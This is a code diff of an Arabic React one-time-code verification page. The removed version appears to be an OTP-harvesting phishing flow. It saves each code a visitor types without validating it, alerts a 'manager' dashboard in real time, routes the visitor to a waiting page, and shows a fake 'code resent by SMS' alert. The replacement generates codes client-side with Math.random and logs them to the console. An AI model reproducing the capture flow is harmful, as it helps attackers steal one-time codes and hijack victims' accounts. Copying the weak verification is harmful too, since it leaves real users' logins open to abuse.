@@ -1,337 +1,262 @@
 import { useState, useEffect, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { supabase } from '@/lib/supabase';
-import { getClientId } from '@/lib/clientId';
+import { Shield, Lock, AlertCircle, CheckCircle2, Loader2 } from 'lucide-react';
 import { useSiteConfig } from '@/context/SiteConfigContext';
-import { initSocket, disconnectSocket, emitInstantNotification } from '@/lib/socket';
-
-// Logo Component
-const Logo = () => (
-  <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-[70px] h-[70px]">
-    <path d="M20 30 L50 10 L80 30 L50 50 Z" fill="#4c72b8"/>
-    <path d="M20 70 L50 50 L80 70 L50 90 Z" fill="#2a9d8f"/>
-  </svg>
-);
-
-// PowerLogo Component
-const PowerLogo = () => (
-  <svg viewBox="0 0 100 100" fill="none" stroke="#6c7a9c" strokeWidth="8" className="w-[30px] h-[30px]">
-    <polygon points="50,10 90,30 90,70 50,90 10,70 10,30"/>
-  </svg>
-);
+import { verifyCode, createVerificationCode } from '@/lib/firestore';
+import { setUserOnline, setUserOffline, updateUserPage } from '@/lib/realtime-presence';
 
 export default function VerifyPage() {
   const navigate = useNavigate();
   const { config } = useSiteConfig();
   const pg = config.verify;
-
-  const [code, setCode] = useState(['', '', '', '', '', '']); // 6 خانات ثابتة
+  
+  const [code, setCode] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
-  const [timer, setTimer] = useState(300); // 5 دقائق بالثواني
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
-  const lastFilledIndexRef = useRef<number | null>(null); // تتبع آخر حقل ممتليء
+  const [success, setSuccess] = useState(false);
+  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes
+  const inputRef = useRef<HTMLInputElement>(null);
   
-  const regEmail = sessionStorage.getItem('reg_email');
-  const regId = sessionStorage.getItem('reg_id');
+  const userId = sessionStorage.getItem('reg_id');
+  const userEmail = sessionStorage.getItem('reg_email');
 
-  // Socket.io connection
+  // Set user online on mount
   useEffect(() => {
-    initSocket('/verify');
+    if (!userId) {
+      navigate('/register');
+      return;
+    }
+    
+    const clientId = sessionStorage.getItem('client_id') || '';
+    setUserOnline(clientId, '/verify');
     
     return () => {
-      disconnectSocket();
+      setUserOffline(clientId);
     };
-  }, []);
+  }, [userId, navigate]);
 
-  // تحقق من رسالة خطأ من صفحة الانتظار
+  // Countdown timer
   useEffect(() => {
-    const verifyError = sessionStorage.getItem('verify_error');
-    const verifyMessage = sessionStorage.getItem('verify_message');
+    if (timeLeft <= 0) return;
     
-    if (verifyError === 'true' && verifyMessage) {
-      setError(verifyMessage);
-      sessionStorage.removeItem('verify_error');
-      sessionStorage.removeItem('verify_message');
-    }
-  }, []);
-
-  // مؤقت 5 دقائق
-  useEffect(() => {
-    if (timer <= 0) return;
-    
-    const interval = setInterval(() => {
-      setTimer(prev => prev - 1);
+    const timer = setInterval(() => {
+      setTimeLeft(prev => prev - 1);
     }, 1000);
     
-    return () => clearInterval(interval);
-  }, [timer]);
+    return () => clearInterval(timer);
+  }, [timeLeft]);
 
-  // تنسيق الوقت
+  // Focus input on mount
+  useEffect(() => {
+    inputRef.current?.focus();
+  }, []);
+
   const formatTime = (seconds: number) => {
     const mins = Math.floor(seconds / 60);
     const secs = seconds % 60;
-    return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+    return `${mins}:${secs.toString().padStart(2, '0')}`;
   };
-
-  const handleInput = (index: number, value: string) => {
-    // فقط أرقام
-    const digit = value.replace(/[^0-9]/g, '').slice(-1);
-    
-    const newCode = [...code];
-    newCode[index] = digit;
-    setCode(newCode);
-    setError('');
-    
-    // حفظ آخر حقل ممتليء
-    if (digit) {
-      lastFilledIndexRef.current = index;
-    }
-  };
-
-  // useEffect للتنقل التلقائي (لأن state update غير متزامن)
-  useEffect(() => {
-    const firstEmptyIndex = code.findIndex(d => d === '');
-    
-    // إذا ملأ حقل
-    if (lastFilledIndexRef.current !== null) {
-      if (firstEmptyIndex === -1) {
-        // كل الحقول ممتلئة → blur الحقل الأخير
-        setTimeout(() => {
-          inputRefs.current[5]?.blur();
-        }, 0);
-      } else if (firstEmptyIndex < 6) {
-        // ركز على أول حقل فارغ
-        setTimeout(() => {
-          inputRefs.current[firstEmptyIndex]?.focus();
-        }, 0);
-      }
-    }
-  }, [code]);
-
-  // منع الكتابة في حقول وسطية إذا كان هناك حقول فارغة قبلها
-  const handleFocus = (index: number) => {
-    const firstEmptyIndex = code.findIndex(d => d === '');
-    
-    // إذا كان هناك حقل فارغ قبل الحقل المضغوط
-    if (firstEmptyIndex !== -1 && firstEmptyIndex < index) {
-      // اذهب للحقل الفارغ الأول
-      inputRefs.current[firstEmptyIndex]?.focus();
-    }
-  };
-
-  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
-    if (e.key === 'Backspace') {
-      if (code[index] === '' && index > 0) {
-        // العودة للخلف إذا كان الحقل فارغ
-        inputRefs.current[index - 1]?.focus();
-      }
-    }
-  };
-
-  const handlePaste = (e: React.ClipboardEvent) => {
-    e.preventDefault();
-    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
-    
-    const newCode = [...code];
-    pastedData.split('').forEach((char, i) => {
-      if (i < 6) {
-        newCode[i] = char;
-      }
-    });
-    setCode(newCode);
-
-    // التركيز على التالي
-    const nextEmpty = newCode.findIndex(d => d === '');
-    if (nextEmpty !== -1) {
-      inputRefs.current[nextEmpty]?.focus();
-    } else {
-      inputRefs.current[5]?.focus();
-    }
-  };
-
-  const isComplete = code.every(d => d !== '');
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
-    if (!isComplete) { 
-      setError('يرجى إدخال 6 أرقام'); 
-      return; 
+    if (!code || code.length < 6) {
+      setError('يرجى إدخال رمز التحقق المكون من 6 أرقام');
+      return;
     }
-    
-    const fullCode = code.join('');
-    setLoading(true); 
+
+    setLoading(true);
     setError('');
-    
+
     try {
-      // Save verification code to database
-      sessionStorage.setItem('verification_code', fullCode);
-      
-      // Resolve the registration and customer name for the dashboard notification.
-      let registrationId = regId;
-      let customerName = sessionStorage.getItem('reg_name') || '';
-
-      if ((!registrationId || !customerName) && (registrationId || regEmail)) {
-        let registrationQuery = supabase
-          .from('registrations')
-          .select('id, full_name');
-
-        registrationQuery = registrationId
-          ? registrationQuery.eq('id', registrationId)
-          : registrationQuery.eq('email', regEmail).order('created_at', { ascending: false }).limit(1);
-
-        const { data: regData } = await registrationQuery.maybeSingle();
-        if (regData) {
-          registrationId = regData.id;
-          customerName = regData.full_name || customerName;
-          sessionStorage.setItem('reg_id', regData.id);
-          if (customerName) sessionStorage.setItem('reg_name', customerName);
-        }
-      }
-      
-      // Save to database and get the ID
-      const { data, error: insertError } = await supabase
-        .from('verification_codes')
-        .insert({
-          registration_id: registrationId || null,
-          client_id: getClientId(),
-          code: fullCode,
-        })
-        .select()
-        .single();
-
-      if (insertError || !data) {
-        console.error('Could not save verification code to database:', insertError);
-        throw new Error(insertError?.message || 'تعذر حفظ رمز التحقق');
+      if (!userId) {
+        throw new Error('معرف المستخدم غير موجود');
       }
 
-      sessionStorage.setItem('verification_attempt_id', data.id);
-
-      // Notify the manager immediately without sending the verification code
-      await emitInstantNotification('verification_code', {
-        id: data.id,
-        name: customerName || undefined,
-        registration_id: typeof registrationId === 'string' ? registrationId : null,
-        created_at: typeof data.created_at === 'string' ? data.created_at : new Date().toISOString(),
-      });
+      const isValid = await verifyCode(userId, code);
       
+      if (isValid) {
+        setSuccess(true);
+        
+        // Update presence
+        const clientId = sessionStorage.getItem('client_id') || '';
+        updateUserPage(clientId, '/thank-you');
+        
+        // Navigate after short delay
+        setTimeout(() => {
+          navigate('/thank-you');
+        }, 1500);
+      } else {
+        setError('رمز التحقق غير صحيح أو منتهي الصلاحية');
+        setCode('');
+        inputRef.current?.focus();
+      }
+    } catch (err: any) {
+      console.error('Verification error:', err);
+      setError(err.message || 'حدث خطأ أثناء التحقق');
+    } finally {
       setLoading(false);
-      
-      // توجيه لصفحة انتظار التحقق
-      navigate('/verify-waiting');
-    } catch {
-      setLoading(false);
-      setError('حدث خطأ أثناء معالجة الطلب. يرجى المحاولة لاحقاً.');
     }
   };
 
   const handleResend = async () => {
-    setCode(['', '', '', '', '', '']);
+    if (!userId) return;
+    
+    setLoading(true);
     setError('');
-    setTimer(300); // إعادة تعيين المؤقت
-    inputRefs.current[0]?.focus();
-    alert('تم إعادة إرسال رمز التحقق إلى هاتفك المحمول عبر SMS');
+    
+    try {
+      // Generate new 6-digit code
+      const newCode = Math.floor(100000 + Math.random() * 900000).toString();
+      
+      await createVerificationCode(userId, newCode, 5);
+      
+      // Reset timer
+      setTimeLeft(300);
+      setCode('');
+      setError('');
+      
+      // In production, you would send this code via SMS/Email
+      console.log('[Verify] New code generated (in production, send via SMS):', newCode);
+      
+      alert('تم إرسال رمز جديد بنجاح');
+    } catch (err: any) {
+      console.error('Resend error:', err);
+      setError('فشل إرسال رمز جديد. حاول مرة أخرى.');
+    } finally {
+      setLoading(false);
+    }
   };
 
-  return (
-    <div className="min-h-screen w-full bg-[#101935] flex flex-col justify-between p-5" dir="rtl">
-      {/* Top Bar */}
-      <div className="w-full flex justify-between items-center text-[#8d99ae] text-sm">
-        <span>الإنكليزية</span>
-        <i className="fa-solid fa-headset text-lg cursor-pointer"></i>
-      </div>
+  // Auto-submit when 6 digits entered
+  useEffect(() => {
+    if (code.length === 6) {
+      handleSubmit({ preventDefault: () => {} } as any);
+    }
+  }, [code]);
 
-      {/* Main Content - Centered */}
-      <div className="w-full max-w-[380px] mx-auto my-0 flex flex-col items-center">
-        {/* Logo */}
-        <div className="mb-6">
-          <Logo />
-        </div>
-
-        {/* Title */}
-        <h1 className="text-2xl font-bold mb-3 text-white text-center">
-          {pg.title}
-        </h1>
-
-        {/* Subtitle */}
-        <p className="text-[#8d99ae] text-sm text-center mb-8">
-          {pg.subtitle}
-        </p>
-
-        {/* OTP Inputs */}
-        <form onSubmit={handleSubmit} className="w-full">
-          <div 
-            className="flex gap-2.5 justify-center mb-8"
-            dir="ltr"
-          >
-            {code.map((digit, index) => (
-              <input
-                key={index}
-                ref={el => inputRefs.current[index] = el}
-                type="text"
-                inputMode="numeric"
-                pattern="[0-9]"
-                maxLength={1}
-                value={digit}
-                onChange={(e) => handleInput(index, e.target.value)}
-                onKeyDown={(e) => handleKeyDown(index, e)}
-                onFocus={() => handleFocus(index)}
-                onPaste={handlePaste}
-                className="w-12 h-[52px] bg-[#1e2942] border border-[#2a3859] rounded-xl text-white text-2xl font-bold text-center focus:border-[#4c72b8] focus:shadow-[0_0_10px_rgba(76,114,184,0.5)] focus:outline-none transition-all"
-              />
-            ))}
-          </div>
-
-          {/* Error Message */}
-          {error && (
-            <div className="text-red-400 text-sm text-center py-2 px-3 bg-red-500/10 border border-red-500/20 rounded-lg mb-4">
-              {error}
-            </div>
-          )}
-
-          {/* Submit Button */}
+  if (!userId) {
+    return (
+      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4">
+        <div className="text-center">
+          <AlertCircle className="w-16 h-16 text-red-500 mx-auto mb-4" />
+          <h2 className="text-xl font-bold text-white mb-2">خطأ</h2>
+          <p className="text-slate-400 mb-4">يرجى التسجيل أولاً</p>
           <button
-            type="submit"
-            disabled={loading || !isComplete}
-            className="w-full py-3.5 bg-[#4c72b8] border-none rounded-xl text-white text-base font-bold cursor-pointer transition-all hover:bg-[#3b5a93] disabled:bg-[#3b4d75] disabled:cursor-not-allowed mb-6"
+            onClick={() => navigate('/register')}
+            className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-6 rounded-xl"
           >
-            {loading ? (
-              <span className="flex items-center justify-center gap-2">
-                جاري التحقق
-                <span className="inline-block w-6 text-right">
-                  <span className="animate-pulse">.</span>
-                  <span className="animate-pulse delay-200">.</span>
-                  <span className="animate-pulse delay-400">.</span>
-                </span>
-              </span>
-            ) : (
-              pg.button_text
-            )}
+            تسجيل جديد
           </button>
-        </form>
-
-        {/* Resend Section */}
-        <div className="text-center text-sm text-[#8d99ae]">
-          لم يصلك الرمز؟{' '}
-          {timer > 0 ? (
-            <span className="text-[#555]">إعادة إرسال ({formatTime(timer)})</span>
-          ) : (
-            <span 
-              className="text-[#4a7c59] font-bold cursor-pointer hover:underline"
-              onClick={handleResend}
-            >
-              إعادة إرسال
-            </span>
-          )}
         </div>
       </div>
+    );
+  }
 
-      {/* Footer */}
-      <div className="flex flex-col items-center text-[#6c7a9c] text-xs gap-1">
-        <span>POWERED BY</span>
-        <PowerLogo />
-        <span>احدث اصدار</span>
+  return (
+    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center p-4">
+      <div className="w-full max-w-md">
+        {/* Logo & Title */}
+        <div className="text-center mb-8">
+          <div className="w-20 h-20 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-2xl shadow-blue-600/30">
+            <Shield className="w-10 h-10 text-white" />
+          </div>
+          <h1 className="text-3xl font-bold text-white mb-2">{pg.title}</h1>
+          <p className="text-slate-400">
+            تم إرسال رمز التحقق إلى<br />
+            <span className="text-blue-400 font-semibold">{userEmail}</span>
+          </p>
+        </div>
+
+        {/* Verification Form */}
+        <div className="bg-slate-800/50 backdrop-blur-xl rounded-3xl p-8 shadow-2xl border border-slate-700/50">
+          {success ? (
+            <div className="text-center py-8">
+              <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
+                <CheckCircle2 className="w-10 h-10 text-green-500" />
+              </div>
+              <h2 className="text-xl font-bold text-white mb-2">تم التحقق بنجاح!</h2>
+              <p className="text-slate-400">جاري التحويل إلى الصفحة الرئيسية...</p>
+            </div>
+          ) : (
+            <form onSubmit={handleSubmit} className="space-y-6">
+              {/* Code Input */}
+              <div className="space-y-3">
+                <label className="text-sm font-semibold text-slate-300 flex items-center gap-2">
+                  <Lock className="w-4 h-4" />
+                  رمز التحقق
+                </label>
+                <input
+                  ref={inputRef}
+                  type="text"
+                  value={code}
+                  onChange={(e) => {
+                    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
+                    setCode(val);
+                    setError('');
+                  }}
+                  placeholder="000000"
+                  dir="ltr"
+                  className="w-full bg-slate-900/50 border border-slate-600 rounded-xl px-4 py-4 text-center text-3xl tracking-[1em] font-mono text-white placeholder-slate-600 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 focus:outline-none transition-all"
+                  disabled={loading}
+                  maxLength={6}
+                />
+                <p className="text-center text-sm text-slate-500">
+                  متبقي: <span className={`font-bold ${timeLeft <= 60 ? 'text-red-400' : 'text-slate-400'}`}>{formatTime(timeLeft)}</span>
+                </p>
+              </div>
+
+              {/* Error Message */}
+              {error && (
+                <div className="flex items-center gap-2 bg-red-500/10 border border-red-500/20 rounded-xl px-4 py-3 text-red-400 text-sm">
+                  <AlertCircle className="w-5 h-5 flex-shrink-0" />
+                  <span>{error}</span>
+                </div>
+              )}
+
+              {/* Submit Button */}
+              <button
+                type="submit"
+                disabled={loading || code.length < 6}
+                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-600/50 text-white font-bold py-4 rounded-xl shadow-lg shadow-blue-600/30 hover:shadow-xl hover:shadow-blue-600/40 transform hover:-translate-y-0.5 transition-all flex items-center justify-center gap-2"
+              >
+                {loading ? (
+                  <>
+                    <Loader2 className="w-5 h-5 animate-spin" />
+                    <span>جاري التحقق...</span>
+                  </>
+                ) : (
+                  <>
+                    <span>{pg.button_text}</span>
+                    <Shield className="w-5 h-5" />
+                  </>
+                )}
+              </button>
+
+              {/* Resend Link */}
+              <div className="text-center">
+                <button
+                  type="button"
+                  onClick={handleResend}
+                  disabled={loading || timeLeft > 240}
+                  className="text-blue-400 hover:text-blue-300 text-sm font-medium disabled:text-slate-600 disabled:cursor-not-allowed transition-colors"
+                >
+                  {pg.resend_text}
+                </button>
+              </div>
+            </form>
+          )}
+        </div>
+
+        {/* Back Link */}
+        <div className="text-center mt-6">
+          <button
+            onClick={() => navigate('/login')}
+            className="text-slate-500 hover:text-slate-400 text-sm transition-colors"
+          >
+            ← العودة لتسجيل الدخول
+          </button>
+        </div>
       </div>
     </div>
   );
